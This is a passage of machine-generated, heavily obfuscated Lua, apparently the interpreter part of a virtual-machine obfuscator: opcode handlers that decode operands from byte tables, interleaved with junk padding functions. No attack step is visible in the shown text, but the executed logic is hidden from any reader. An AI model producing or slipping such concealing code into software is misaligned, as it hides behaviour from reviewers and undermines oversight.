m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+169830)%256))%0x100)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%0B100_000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0B1000001100110111+0B101001011101100110)%0X100))%0b100000000)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0Xa_6177)%0x100))*256;_e=_e+2;Xwt[JkZ(m+1)]=bwo[w6] end local function Taz() local _junk=bwo[50];bwo[44]=_junk end local function _5p()  end local function F() bwo[49]=(bwo[22] or 0)+9 end local function c() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X833_7+0B101001011101100110)%0b100000000))%0b100000000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0Xa61_77)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0B1000001100110111+169830)%0B10_0000000))%0x100)%0b10_0000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0B1101110110101000000+680311)%0b100000000))*256-32768;_e=_e+2;_e=_e+w6 end local function bG4() local _junk=(_e%7)+8 end local function j2() bwo[CXt+1]=bwo[CXt] end local function cn3() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b10000011001_10111+169830)%256))%256)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+680311)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0B1010_01011101100110)%256))%0x100)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+0b10100110000101110111)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+169830)%0x100))%256)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110110101000000+0b10100110000101110111)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X833_7+169830)%0B100000000))%0b100000_000)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0b10100110000101110111)%256))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+0b101001011101_100110)%0X10_0))%0b10000000_0)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+0xa6177)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+0b101001011101100110)%0B100000000))%256)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+0b10100110000101110111)%0B100000000))*256;_e=_e+2;bwo[w6][bwo[m]]=bwo[JNt] end local function Vx4() bwo[44]=nil end local function oe4() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+169830)%256))%0X100)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0b10100110000101110111)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+0X29766)%0x100))%0b1000_00000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0Xa6177)%0B10000000_0))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B1000001100110111+0X2976_6)%256))%256)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed_40+680311)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b10000011001_10111+169830)%256))%256)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+680311)%0B1_00000000))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8_337+169830)%256))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+680311)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+169830)%256))%0x100)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0Xa6177)%0B100000000))*256;_e=_e+2;bwo[w6]=bwo[m][bwo[JNt]] end local function P4U() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+0X29766)%0b100000000))%0X100)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+0B1010011000010111_0111)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X83_37+0b10100101110110011_0)%0b100000000))%256)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+680311)%0x1_00))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+0B101001011101100110)%0b100000000))%256)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0B1010011000010_1110111)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x833_7+0x29766)%0b100000000))%256)%0b100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+680311)%256))*256;_e=_e+2;bwo[w6]=JkZ(m+1) end local function h() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0b1010010111011001_10)%256))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0b11011_10110101000000+0Xa6177)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x833_7+0X29_766)%0x100))%0X1_00)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+680311)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0x29766)%256))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6e_d40+0B10100110_000101110111)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0B101001011101100110)%256))%256)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0Xa_6177)%0X100))*256;_e=_e+2;fjv[m+1][1]=bwo[w6] end local function oP() bwo[40]=nil end local function zZ() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X833_7+0X29766)%256))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0b11_01110110101000000+0b10100110000101110111)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+0x29766)%0B10000_0000))%256)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1_101110110101000000+0B10100110000101110111)%0x100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+0x29766)%256))%0B100000_000)%0B10_0000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0b11011_10110101000000+0xa6177)%0B10000_0000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+0B101001011101100110)%0x100))%0X100)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0b10100_110000101110111)%0X100))*256;_e=_e+2;bwo[w6]=bwo[m] end local function j3X() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+169830)%256))%0x1_00)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0B101001100001_01110111)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0b1_01001011101100110)%0B100000000))%0b100000000)%0b100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b110111011010100_0000+0xa6177)%0X100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+169830)%256))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0b11011101101010_00000+0B101001_10000101110111)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0b1010010111_01100110)%0x100))%0X100)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+0xa6177)%0x100))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+0B101001011101100110)%0x100))%0X100)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%0X10_0))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+0X2976_6)%0x1_00))%256)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+680311)%0B100000000))*256;_e=_e+2;bwo[w6]=bwo[m]%bwo[JNt] end local function LW() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0x29766)%256))%0B100000000)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6e_d40+0xa61_77)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0B1000001100110111+0x2_9766)%256))%256)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0B101001_10000101110111)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+0B1010010111_01100110)%256))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+0B10100110000101110111)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0B1_000001100110111+169830)%0b100000000))%256)%0B1000000_00),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0B10100110000101110111)%256))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+169830)%0X1_00))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110110101000000+680311)%0X1_00))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+0B101001011101100110)%256))%0B100000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0b10100110000101110111)%256))*256;_e=_e+2;if (bwo[m]<bwo[JNt])~=(w6~=0) then _e=_e+1+2 end end local function v3() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0x2976_6)%256))%0b100000000)%0X100),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0xa6177)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+0x29766)%256))%256)%0b1000000_00),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+680311)%0x100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001_100110111+0x297_66)%0x10_0))%256)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+0Xa6177)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+169830)%256))%0b100000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0B101001100_00101110111)%256))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+0X29766)%0X10_0))%0x100)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+0xa6_177)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x83_37+169830)%0B10_0000000))%0x100)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0B1101110110101000000+680311)%0X100))*256;_e=_e+2;bwo[w6]=bwo[m]^bwo[JNt] end local function q5() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b10_00001100110111+0x29766)%0b1_00000000))%0B100000000)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0xa6177)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0x29766)%0B100000000))%256)%0b100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+0Xa_6177)%0x10_0))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+0B1010010111011_00110)%0x100))%256)%0X100),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0B101001100001_01110111)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0b101001011101100110)%256))%256)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0b101_00110000101110111)%256))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0b101001011101100110)%0X10_0))%0B1000000_00)%0X1_00),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0B10100110000101110111)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x83_37+0B101001011101100110)%256))%256)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+680311)%0X1_00))*256;_e=_e+2;bwo[w6]=DV(bwo[m]%4294967296,bwo[JNt]%4294967296) end local function B2M() local _junk=(_e%7)+6 end local function Wm5() bwo[0]=(bwo[23] or 0)+1 end local function E4M() bwo[52]=nil end local function lW() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+0X29766)%0B100000000))%256)%0X100),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0xa6177)%0b1_00000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0b101001011101100110)%0x100))%0X1_00)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed4_0+680311)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+0x29766)%0b100000000))%0b100000000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+0B1010011000_0101110111)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b10_00001100110111+0B101001011101100110)%0b100000000))%256)%0B10_0000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0B1010011000010111_0111)%0B100000000))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+0B101001011101100110)%256))%256)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0b10100110000101110111)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0X29766)%0X100))%0b100000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+680311)%0X10_0))*256;_e=_e+2;bwo[w6]={} end local function ytY() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B1000001100110111+0X29766)%0x100))%256)%0X10_0),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0B10100110000101110111)%0X1_00))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0X29_766)%0B100000000))%0b100000000)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+0xa6177)%0X100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0B101001011_101100110)%0B10000000_0))%0x1_00)%0b100000_000),tc(Gi[(_e-1)%tR+1],((_e-1)*0b11011_10110101000000+0b101_00110000101110111)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0B101001011101100110)%0b100000_000))%0B100000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0B10100110000101110111)%0b100000000))*256;_e=_e+2;bwo[w6]=#(bwo[m]) end local function r1() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B1000001100110111+0X29766)%0b100000000))%0B100000000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6e_d40+0xa6177)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x833_7+0X29766)%0b100000000))%0b10000000_0)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0xa6177)%0X10_0))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B10000011_00110111+0b101001011101100110)%256))%0x100)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+169830)%0X100))%0x100)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+0B101001_10000101110111)%256))*256;_e=_e+2;bwo[w6][1]=bwo[m] end local function Za() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+169830)%0b1000_00000))%0B100000000)%0x1_00),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+0B10100110000101110111)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b10000_01100110111+0b101001011101100110)%0x1_00))%0X100)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+0B10100110000101110111)%0X100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B1000001100110111+0b101001011101100110)%0X100))%256)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0b101001011101100110)%0X1_00))%256)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0xa6177)%0x10_0))*256;_e=_e+2;bwo[w6]=fjv[m+1][1] end local function M() local _junk=bwo[59];bwo[13]=_junk end local function ps() bwo[CXt+1]=bwo[CXt] end local function LKn() bwo[62]=nil end local function V() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0x29766)%0X100))%0b100000000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110_110101000000+0Xa6177)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0b101001011101100110)%256))%0X1_00)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0Xa6177)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x83_37+0x29766)%256))%0X100)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+680311)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0x29766)%0B10000_0000))%256)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+0B10100110000101110111)%0X100))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0x1_00))%0x100)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed4_0+0b10100110000101110111)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+0b101001011101100110)%256))%0B100000000)%0x10_0),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101_110110101000000+680311)%0X10_0))*256;_e=_e+2;local _C0=bwo[m];for _mv=m+1,JNt do _C0=_C0..bwo[_mv] end;bwo[w6]=_C0 end local function dpW() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0X29766)%0x1_00))%256)%0B100_000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+680311)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+169830)%0b100000000))%0B100000000)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+680311)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B10000011001101_11+0x2976_6)%256))%256)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0Xa6177)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+169830)%0b100000000))%0X100)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+680311)%256))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001_100110111+169830)%256))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+0xa6177)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+169830)%0X1_00))%256)%0x1_00),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101_000000+0B101_00110000101110111)%0B100000000))*256;_e=_e+2;bwo[w6]=A(bwo[m]%4294967296,bwo[JNt]%4294967296) end local function ENH() bwo[CXt+1]=bwo[CXt] end local function Q() bwo[39]=(bwo[5] or 0)+1 end local function JN() local _junk=(_e%7)+6 end local function fDz() local _junk=(_e%7)+9 end local function j() bwo[15]=bwo[31] or 0 end local function vm() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+169830)%0X1_00))%256)%0b10000_0000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0B101001011101100110)%256))%0B100000000)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0xa6177)%0X100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B1000001100110111+0b10100101_1101100110)%0B100000000))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6_ed40+0Xa61_77)%0X10_0))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+169830)%0b100000000))%0b100000000)%0b100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+680311)%0x10_0))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+169830)%256))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X83_37+0x2_9766)%256))%0x100)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+680311)%256))*256;_e=_e+2;bwo[w6]=bwo[m][bwo[JNt]] end local function SY() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0b101001011101100110)%0X1_00))%0X100)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0b10100110000101110111)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X83_37+169830)%0X100))%0B100000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0Xa6177)%0b100000000))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8_337+0X2_9766)%0X100))%256)%0X100),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0xa6177)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0B1000001100110111+0b101001011101100110)%0B100000000))%0b100000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0b1010011_0000101110111)%256))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0b100000000))%0B10000000_0)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0B10100110000101110111)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b100_0001100110111+0x2_9766)%0x100))%256)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0B1010011000_0101110111)%0b100000000))*256;_e=_e+2;bwo[w6]=bwo[m]*bwo[JNt] end local function p9() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0x100))%0X10_0)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0xa6177)%0B100_000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+0b101001011101100110)%0X1_00))%0b10000_0000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0B10100110000101110111)%0B100_000000))*256-32768;_e=_e+2;_e=_e+w6 end local function e() bwo[0]=bwo[46] or 0 end local function eXW() bwo[CXt+1]=bwo[CXt] end local function qji() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0b101001011101100110)%0x100))%0b100000000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+680311)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X833_7+0X29766)%0b100000000))%256)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6e_d40+0b10100_110000101110111)%0x100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+0b101001011101100110)%256))%0B100000000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+680311)%0X1_00))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b100000110011011_1+0x29766)%256))%0x1_00)%0b100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0b1010_0110000101110111)%0x100))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x833_7+169830)%0X1_00))%256)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+0Xa6177)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+0B101001_011101100110)%0B100000_000))%256)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+680311)%256))*256;_e=_e+2;bwo[w6]=A(bwo[m]%4294967296,bwo[JNt]%4294967296) end local function Z70() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0B101001011101100110)%256))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+680311)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+0X29766)%256))%0b100000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+0xa61_77)%0x100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%256))%0B100_000000)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed4_0+0Xa6_177)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+169830)%256))%0b100000000)%0x10_0),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+680311)%0b10000000_0))*256;_e=_e+2;Xwt[JkZ(m+1)]=bwo[w6] end local function mQ() local 